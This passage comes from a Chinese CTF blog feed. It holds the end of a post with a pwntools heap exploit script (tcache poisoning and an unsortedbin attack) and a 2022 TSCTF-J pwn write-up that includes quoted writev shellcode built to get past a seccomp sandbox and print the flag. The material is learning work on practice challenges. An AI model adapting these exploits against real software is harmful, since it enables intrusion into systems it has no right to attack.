punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'4869'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>tcache_poisoning <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602200</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>tcache_poisoning<span class="token punctuation">)</span><span class="token punctuation">,</span>tcache_poisoning<span class="token punctuation">)</span>  create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#此时Tcache的counts域已为-1，完成绕过</span>  create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 防止与top chunk合并</span><span class="token comment" spellcheck="true">#Unsortedbin Attack</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> magic<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>文中提出的这一绕过方法利用价值不大，但这也是我第一次通过源码来分析问题，还是有一点纪念意义的<br>我倒是希望在以后的做题中能有这一绕过方法的用武之地吧</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022TSCTF-J</title>
      <link href="/2022/11/09/2022tsctf-j-writeup-2022.10.17/"/>
      <url>/2022/11/09/2022tsctf-j-writeup-2022.10.17/</url>
      
        <content type="html"><![CDATA[<p>[[PWN ？！]]<br>[[PWN生涯]]</p><ul><li><h3 id="–writeby-HanQi"><a href="#–writeby-HanQi" class="headerlink" title="–writeby__HanQi"></a>–writeby__HanQi</h3></li><li><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1>算是正式做的第一次比赛吧，啥也不会坐牢四天（悲<br>题目难度感觉还好(不会做都是我太菜)（比moe或hn难一点？至少pwn题是这样<br>也是第一次写wp，认真写一下留个纪念</li><li><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><h2 id="checkin-stackoverflow"><a href="#checkin-stackoverflow" class="headerlink" title="checkin(stackoverflow)"></a>checkin(stackoverflow)</h2><ul><li><h3 id="checksec-IDA"><a href="#checksec-IDA" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>栈溢出覆盖ch_0的值就好了</li><li><img src="https://i.niupic.com/images/2022/10/17/a9tq.png"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tr.png"></li></ul></li><li><h2 id="ヰ世界転生-int-overflow-ret2text"><a href="#ヰ世界転生-int-overflow-ret2text" class="headerlink" title="ヰ世界転生(int overflow+ret2text)"></a>ヰ世界転生(int overflow+ret2text)</h2><ul><li><h3 id="checksec-IDA-1"><a href="#checksec-IDA-1" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>循环lose累积分数<br><img src="https://i.niupic.com/images/2022/10/17/a9tG.png">{:height 992, :width 776}<br>末尾有一个point_checker的函数，进去看一眼，给points设了上限，盲猜是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9ts.png"><br>然后是用分数换技能，前面花里胡哨没啥用（命名竟然比技能贵…<br><img src="https://i.niupic.com/images/2022/10/17/a9tt.png"><br>从有输入的地方开始看，第一次先输入长度nbytes，再第二次输入内容存到buf，对nbytes有长度限制，估计还是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9tH.png"><br>大概逻辑理清后来找一找后门函数或’/bin/sh’（其实一来就该找？<br><img src="https://i.niupic.com/images/2022/10/17/a9ty.png"><br>再关注一下刚刚发现的两个整形溢出点，看一下有无类型转换之类的，还真有<br><img src="https://i.niupic.com/images/2022/10/17/a9tz.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tM.png"></li><li><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tv.png"></li></ul></li><li><h2 id="ret2shellcode-orw"><a href="#ret2shellcode-orw" class="headerlink" title="ret2shellcode(orw)"></a>ret2shellcode(orw)</h2><ul><li><h3 id="checksec-IDA-gdb"><a href="#checksec-IDA-gdb" class="headerlink" title="checksec+IDA+gdb"></a>checksec+IDA+gdb</h3>大概流程就是mmap分配一个可写可执行的空间，让你写入code并执行<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>尝试shellcraft.sh()后未成功，gdb调试发现系统调用时进程崩溃,显示“bad syscall” 搜索后发现有沙盒<br>第一次见 并在init函数里发现函数prctl 禁止了execve调用，仅允许open、read、write读取flag<br><img src="https://i.niupic.com/images/2022/10/17/a9tN.png"></li><li><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>利用pwntools写orw的汇编，发现长度过长，只能手写<br><img src="https://i.niupic.com/images/2022/10/17/a9tx.png"><br>换成如下(其实还是网上找的code,原code还是长了,在出题人提示下删掉了重复的参数布置过程)<br><img src="https://i.niupic.com/images/2022/10/17/a9tO.png"></li></ul></li><li><h2 id="ASCII-ART-partial-overwrite"><a href="#ASCII-ART-partial-overwrite" class="headerlink" title="ASCII_ART(partial overwrite)"></a>ASCII_ART(partial overwrite)</h2><ul><li><h3 id="checksec-IDA-2"><a href="#checksec-IDA-2" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>简洁的main函数（并不影响我看不懂<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>找找后门，有好东西<br><img src="https://i.niupic.com/images/2022/10/17/a9tQ.png"><br>gdb发现输入是可以覆盖返回地址的，再加上开了pie，那就是partial overwrite<br><img src="https://i.niupic.com/images/2022/10/17/a9tE.png"></li><li><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tA.png"></li></ul></li><li><h2 id="Another-Checkin-Pwn-blind-fmtstr"><a href="#Another-Checkin-Pwn-blind-fmtstr" class="headerlink" title="Another_Checkin_Pwn(blind fmtstr)"></a>Another_Checkin_Pwn(blind fmtstr)</h2>没做出来，还是写一下（也不知道binary为啥没dump下来<br>没文件IDA不了了，输入字符发现回显，那就是格式化字符串盲打了，换了好多种写法，最终还是没<br>dump下来，(记住有循环…不用每次都remote)<br>还有两个没删的脚本放一放，以后再回来看为啥不行<br><img src="https://i.niupic.com/images/2022/10/17/a9tR.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tX.png"></li><li><h2 id="Easy-shellcode"><a href="#Easy-shellcode" class="headerlink" title="Easy shellcode"></a>Easy shellcode</h2>没有写出来，不过确实学到很多<ul><li><h3 id="checksec-IDA-seccomp-tools"><a href="#checksec-IDA-seccomp-tools" class="headerlink" title="checksec+IDA+seccomp-tools"></a>checksec+IDA+seccomp-tools</h3>mmap开了一块空间存入flag.txt，再mmap了一段可执行的空间写code，空间内开头的一段code是清空寄存器(还傻乎乎的asm反汇编，gdb就能看啊),后面的空间就交给我们操作。<br><img src="https://i.niupic.com/images/2022/10/17/a9tC.png"><br>重要的一点就是寄存器并没有完全清空，r15里还存有初始地址，可以通过找到text段的地址<br><img src="https://i.niupic.com/images/2022/10/17/a9tD.png"><br>找到了prctl，看一下沙盒规则,发现见过的调用全部ban掉 （其实经测试read，open，write是可以用的，但可能是参数布置的问题读到了但是没有打印出来，错失白给的机会呜呜，反馈后更新了附件）<br><img src="https://i.niupic.com/images/2022/10/17/a9tB.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tS.png"></li><li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（应该是不行的）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li></ul></li></ul><h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3><p>  ```python<br>sc = “””<br>lea rsp, [rip+0x500]<br>lea r13, [rip]<br>mov r14, 0xfffffff00000<br>and r13, r14 # 使r13页对齐<br>loop:<br>  add r13, 0x1000<br>  pop r14 #回收上一次push的r13地址<br>  pop r14<br>  push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_len<br>  push r13<br>  mov rdi, 2<br>  mov rsi, rsp<br>  mov rdx, 1<br>  mov rcx, 0<br>  mov rax, 20<br>  syscall<br>  cmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读<br>  jl loop # 若不可读再次循环<br>mov rdi, [r13]<br>cmp edi, 0x54435354 #判断字符串是否以TSCT开头<br>jnz loop<br>push 31<br>push r13<br>mov rdi, 2<br>mov rsi, rsp<br>mov rdx, 1<br>mov rcx, 0<br>mov rax, 20<br>syscall #打印flag<br>jmp $<br>“””</p></li></ul><p>```<br>    - ### question<br>        这个地方的文件描述符错误应该是2，系统调用可用writev<br>          <img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><br>        - ## 堆相关<br>          其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</p><ul><li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
